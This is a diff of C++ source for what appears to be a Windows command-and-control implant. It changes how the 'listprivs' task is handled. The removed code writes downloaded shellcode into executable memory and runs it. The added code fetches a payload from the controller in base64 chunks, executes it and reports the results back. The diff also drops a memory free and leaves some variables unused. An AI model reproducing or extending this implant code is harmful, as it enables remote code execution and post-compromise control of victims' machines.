@@ -108,6 +108,7 @@ std::string sendRequest(const std::string& jsonData) {
 	const char* headers = "Content-Type: application/json";
 	DWORD headerSize;
 	SIZETToDWord(strlen(headers), &headerSize);
+		
 
 	// Encode and wrap the JSON data
 	std::string encodedJson = base64_encode(jsonData);
@@ -768,7 +769,6 @@ std::string executeShellcode(BYTE* execMem) {
 					WideCharToMultiByte(CP_UTF8, 0, resultW, (int)wlen, &finalResult[0], len, NULL, NULL);
 				}
 			}
-			LocalFree(resultW);
 		}
 	}
 	catch (const std::exception& e) {
@@ -787,34 +787,51 @@ void handleListPrivs(const std::string &agent_id, const std::string &taskID, con
 	start["file_id"] = fileID;
 
 	json DownloadStart;
-	DownloadStart["ht"] = 7;  // DownloadStart
+	DownloadStart["ht"] = 7;
 	DownloadStart["data"] = base64_encode(start.dump());
 
 	std::string startcheck = sendRequest(DownloadStart.dump());
-	json startData = json::parse(startcheck);
+	PRINTF("[DEBUG] DownloadStart response: %s\n", startcheck.c_str());
 
-	std::string chunk = startData.at("chunk");
-	std::string rawShellcode = base64_decode(chunk);
-	size_t shellSize = rawShellcode.size();
+	json startRet = json::parse(startcheck);
+	int totalChunks = startRet.at("total");
+	int nextChunkID = startRet.at("next_chunk_id");
+	std::string listprivs = startRet.at("chunk");
 
-	BYTE* execMem = (BYTE*)VirtualAlloc(NULL, shellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (!execMem) {
-		sendTaskResult(agent_id, taskID, 5, "");
-		PRINTF("[-] VirtualAlloc failed.\n");
-		return;
+	while (nextChunkID != 0) {
+		json downloadChunk;
+		downloadChunk["file_id"] = fileID;
+		downloadChunk["chunk_id"] = nextChunkID;
+
+		json wrapDownloadChunk;
+		wrapDownloadChunk["ht"] = 8;
+		wrapDownloadChunk["data"] = base64_encode(downloadChunk.dump());
+
+		std::string downloadChunkResponse = sendRequest(wrapDownloadChunk.dump());
+		PRINTF("[DEBUG] DownloadChunk response: %s\n", downloadChunkResponse.c_str());
+		json chunkJ = json::parse(downloadChunkResponse);
+		std::string newchunk = chunkJ.at("chunk");
+		listprivs.append(newchunk);
+		nextChunkID = chunkJ.at("next_chunk_id");
 	}
 
-	memcpy(execMem, rawShellcode.data(), shellSize);
+	json endDownloadData;
+	endDownloadData["task_id"] = taskID;
+	endDownloadData["agent_id"] = agent_id;
+	endDownloadData["status"] = 4;
 
-	std::string finalResult = executeShellcode(execMem);
+	json endDownload;
+	endDownload["ht"] = 9;
+	endDownload["data"] = base64_encode(endDownloadData.dump());
+	size_t shellSize = listprivs.size();
 
-	VirtualFree(execMem, 0, MEM_RELEASE);
-
-	if (!finalResult.empty()) {
+	std::string result;
+	int ret = load_execute_listprivs(listprivs, result);
+	if (ret == 0 && !result.empty()) {
 		// Base64 encode the result to send to the CLI
-		std::string encodedResult = base64_encode(finalResult);
+		std::string encodedResult = base64_encode(result);
 		sendTaskResult(agent_id, taskID, 4, encodedResult);
-		PRINTF("[+] Completed task: listprivs\n[+] Result:\n%s\n", finalResult.c_str());
+		PRINTF("[+] Completed task: listprivs\n[+] Result:\n%s\n", result.c_str());
 	}
 	else {
 		sendTaskResult(agent_id, taskID, 5, "");
